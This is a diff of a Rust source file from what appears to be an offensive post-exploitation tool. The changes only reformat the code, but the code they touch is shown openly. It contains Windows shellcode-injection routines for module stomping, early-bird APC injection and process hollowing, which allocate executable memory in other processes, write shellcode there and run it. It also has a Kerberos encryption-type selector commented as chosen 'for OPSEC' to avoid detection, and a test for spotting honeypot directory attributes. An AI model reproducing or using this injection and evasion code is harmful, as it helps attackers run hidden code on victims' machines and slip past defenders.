@@ -313,10 +313,10 @@ pub fn resolve_syscall_numbers() -> Result<std::collections::HashMap<String, u32
 /// with legitimate Kerberos traffic.
 pub fn prefer_kerberos_etype(preferred_etype: i32) -> i32 {
     match preferred_etype {
-        18 => 18,  // AES256-CTS-HMAC-SHA1-96
-        17 => 17,  // AES128-CTS-HMAC-SHA1-96
-        23 => 23,  // RC4-HMAC (legacy, detectable)
-        _ => 18,   // Default to AES256 for OPSEC
+        18 => 18, // AES256-CTS-HMAC-SHA1-96
+        17 => 17, // AES128-CTS-HMAC-SHA1-96
+        23 => 23, // RC4-HMAC (legacy, detectable)
+        _ => 18,  // Default to AES256 for OPSEC
     }
 }
 
@@ -386,7 +386,9 @@ pub unsafe fn module_stomping_injection(
         };
 
         let process_handle = OpenProcess(
-            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION
+            PROCESS_CREATE_THREAD
+                | PROCESS_QUERY_INFORMATION
+                | PROCESS_VM_OPERATION
                 | PROCESS_VM_WRITE,
             false,
             target_pid,
@@ -402,7 +404,9 @@ pub unsafe fn module_stomping_injection(
 
         if remote_addr.is_null() {
             CloseHandle(process_handle).ok();
-            return Err(OverthroneError::PostExploitation("VirtualAllocEx failed".into()));
+            return Err(OverthroneError::PostExploitation(
+                "VirtualAllocEx failed".into(),
+            ));
         }
 
         let mut bytes_written: usize = 0;
@@ -418,9 +422,10 @@ pub unsafe fn module_stomping_injection(
             process_handle,
             None,
             0,
-            Some(std::mem::transmute::<usize, extern "system" fn(*mut std::ffi::c_void) -> u32>(
-                remote_addr as usize,
-            )),
+            Some(std::mem::transmute::<
+                usize,
+                extern "system" fn(*mut std::ffi::c_void) -> u32,
+            >(remote_addr as usize)),
             None,
             0,
             None,
@@ -430,7 +435,10 @@ pub unsafe fn module_stomping_injection(
         CloseHandle(process_handle).ok();
         CloseHandle(thread).ok();
 
-        info!("Module stomping: pid={target_pid}, size={}", shellcode.len());
+        info!(
+            "Module stomping: pid={target_pid}, size={}",
+            shellcode.len()
+        );
         Ok(())
     }
 }
@@ -456,10 +464,7 @@ pub unsafe fn module_stomping_injection(
 /// The caller must ensure the target executable and injected shellcode are
 /// appropriate for the process being launched.
 #[cfg(target_os = "windows")]
-pub unsafe fn early_bird_apc_injection(
-    target_exe: &str,
-    shellcode: &[u8],
-) -> Result<u32> {
+pub unsafe fn early_bird_apc_injection(target_exe: &str, shellcode: &[u8]) -> Result<u32> {
     unsafe {
         use windows::Win32::Foundation::CloseHandle;
         use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
@@ -467,8 +472,8 @@ pub unsafe fn early_bird_apc_injection(
             MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx,
         };
         use windows::Win32::System::Threading::{
-            CreateProcessA, QueueUserAPC, ResumeThread, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION,
-            STARTUPINFOA,
+            CreateProcessA, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, QueueUserAPC,
+            ResumeThread, STARTUPINFOA,
         };
 
         let cmd = std::ffi::CString::new(target_exe)
@@ -505,7 +510,9 @@ pub unsafe fn early_bird_apc_injection(
         if remote_addr.is_null() {
             CloseHandle(pi.hProcess).ok();
             CloseHandle(pi.hThread).ok();
-            return Err(OverthroneError::PostExploitation("VirtualAllocEx failed".into()));
+            return Err(OverthroneError::PostExploitation(
+                "VirtualAllocEx failed".into(),
+            ));
         }
 
         let mut bytes_written: usize = 0;
@@ -518,9 +525,9 @@ pub unsafe fn early_bird_apc_injection(
         )?;
 
         QueueUserAPC(
-            Some(std::mem::transmute::<usize, extern "system" fn(usize) -> ()>(
-                remote_addr as usize,
-            )),
+            Some(
+                std::mem::transmute::<usize, extern "system" fn(usize) -> ()>(remote_addr as usize),
+            ),
             pi.hThread,
             0,
         );
@@ -531,16 +538,16 @@ pub unsafe fn early_bird_apc_injection(
         CloseHandle(pi.hProcess).ok();
         CloseHandle(pi.hThread).ok();
 
-        info!("Early bird APC: exe={target_exe}, size={} bytes, pid={pid}", shellcode.len());
+        info!(
+            "Early bird APC: exe={target_exe}, size={} bytes, pid={pid}",
+            shellcode.len()
+        );
         Ok(pid)
     }
 }
 
 #[cfg(not(target_os = "windows"))]
-pub unsafe fn early_bird_apc_injection(
-    _target_exe: &str,
-    _shellcode: &[u8],
-) -> Result<u32> {
+pub unsafe fn early_bird_apc_injection(_target_exe: &str, _shellcode: &[u8]) -> Result<u32> {
     Err(OverthroneError::PostExploitation(
         "Early bird APC not available on this platform".into(),
     ))
@@ -555,10 +562,7 @@ pub unsafe fn early_bird_apc_injection(
 /// The caller must ensure the target executable and injected shellcode are
 /// appropriate for the process being launched.
 #[cfg(target_os = "windows")]
-pub unsafe fn process_hollowing_injection(
-    target_exe: &str,
-    shellcode: &[u8],
-) -> Result<u32> {
+pub unsafe fn process_hollowing_injection(target_exe: &str, shellcode: &[u8]) -> Result<u32> {
     unsafe {
         use windows::Win32::Foundation::CloseHandle;
         use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
@@ -566,7 +570,7 @@ pub unsafe fn process_hollowing_injection(
             MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx,
         };
         use windows::Win32::System::Threading::{
-            CreateProcessA, ResumeThread, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, STARTUPINFOA,
+            CreateProcessA, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, ResumeThread, STARTUPINFOA,
         };
 
         let cmd = std::ffi::CString::new(target_exe)
@@ -603,7 +607,9 @@ pub unsafe fn process_hollowing_injection(
         if remote_addr.is_null() {
             CloseHandle(pi.hProcess).ok();
             CloseHandle(pi.hThread).ok();
-            return Err(OverthroneError::PostExploitation("VirtualAllocEx failed".into()));
+            return Err(OverthroneError::PostExploitation(
+                "VirtualAllocEx failed".into(),
+            ));
         }
 
         let mut bytes_written: usize = 0;
@@ -621,16 +627,16 @@ pub unsafe fn process_hollowing_injection(
         CloseHandle(pi.hProcess).ok();
         CloseHandle(pi.hThread).ok();
 
-        info!("Process hollowing: exe={target_exe}, size={} bytes, pid={pid}", shellcode.len());
+        info!(
+            "Process hollowing: exe={target_exe}, size={} bytes, pid={pid}",
+            shellcode.len()
+        );
         Ok(pid)
     }
 }
 
 #[cfg(not(target_os = "windows"))]
-pub unsafe fn process_hollowing_injection(
-    _target_exe: &str,
-    _shellcode: &[u8],
-) -> Result<u32> {
+pub unsafe fn process_hollowing_injection(_target_exe: &str, _shellcode: &[u8]) -> Result<u32> {
     Err(OverthroneError::PostExploitation(
         "Process hollowing not available on this platform".into(),
     ))
@@ -673,7 +679,12 @@ mod tests {
 
     #[test]
     fn test_honeypot_attrs_detection() {
-        let attrs = &["sAMAccountName", "ms-Mcs-AdmPwd", "cn", "msDS-ManagedPassword"];
+        let attrs = &[
+            "sAMAccountName",
+            "ms-Mcs-AdmPwd",
+            "cn",
+            "msDS-ManagedPassword",
+        ];
         let detected = contains_honeypot_attrs(attrs);
         assert_eq!(detected.len(), 2);
         assert!(detected.contains(&"ms-Mcs-AdmPwd"));
